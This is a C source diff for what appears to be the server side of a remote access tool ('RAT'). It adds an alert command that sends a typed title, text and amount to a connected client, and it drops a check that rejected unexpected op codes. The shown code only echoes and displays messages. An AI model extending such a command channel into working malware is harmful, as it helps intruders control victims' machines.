@@ -70,6 +70,18 @@ static void *read_ratpacket(ratpacket_t *p) {
   return p;
 }
 
+static void read_alert(ratpacket_t *p) {
+  alert_t *alert = (alert_t *) &p->data;
+  puts("enter title:");
+  fgets(alert->title, sizeof(alert->title), stdin);
+  puts("enter text:");
+  fgets(alert->text, sizeof(alert->text), stdin);
+  puts("enter amount:");
+  char num_buf[9 + 2]; // max int len
+  fgets(num_buf, sizeof(num_buf), stdin);
+  alert->amount = atoi(num_buf);
+}
+
 static void handle_client(SOCKET client) {
   char bufc[DEFAULT_BUFLEN], bufs[DEFAULT_BUFLEN];
   memset(bufc, 0, DEFAULT_BUFLEN);
@@ -89,7 +101,7 @@ static void handle_client(SOCKET client) {
       if (send(client, (char *)ps, sizeof(*ps) + ps->data_len, 0) ==
           SOCKET_ERROR) {
         LOG_ERR("send failed with %d", WSAGetLastError());
-        break;
+        return;
       }
       LOG_DEBUG("sent");
       int recbytes = recv(client, (char *)pc, sizeof(*pc), 0);
@@ -99,12 +111,6 @@ static void handle_client(SOCKET client) {
       }
       if (recbytes < 0) {
         LOG_ERR("recv failed with %d", WSAGetLastError());
-        break;
-      }
-      if (pc->op != RAT_PACKET_ECHO) {
-        LOG_ERR("unexpected op code - expected %s (%d) received %s (%d)",
-                rat_opcode_to_str(ps->op), ps->op, rat_opcode_to_str(pc->op),
-                pc->op);
         break;
       }
       recbytes = recv(client, (char *)pc->data, pc->data_len, 0);
@@ -117,6 +123,18 @@ static void handle_client(SOCKET client) {
         break;
       }
       printf("%s", pc->data);
+      break;
+    case RAT_PACKET_ALERT:
+      ps->data_len = sizeof(alert_t);
+      read_alert(ps);
+      alert_t *alert = (alert_t*)ps->data;
+      LOG_DEBUG("received alert title=\"%s\" text\"%s\" amount=\"%d\"",
+                alert->title, alert->text, alert->amount);
+      if (send(client, (char *)ps, sizeof(*ps) + ps->data_len, 0) ==
+          SOCKET_ERROR) {
+        LOG_ERR("send failed with %d", WSAGetLastError());
+        break;
+      }
       break;
     default:
       LOG_DEBUG("unimplemented opcode %s (%d)", rat_opcode_to_str(ps->op),
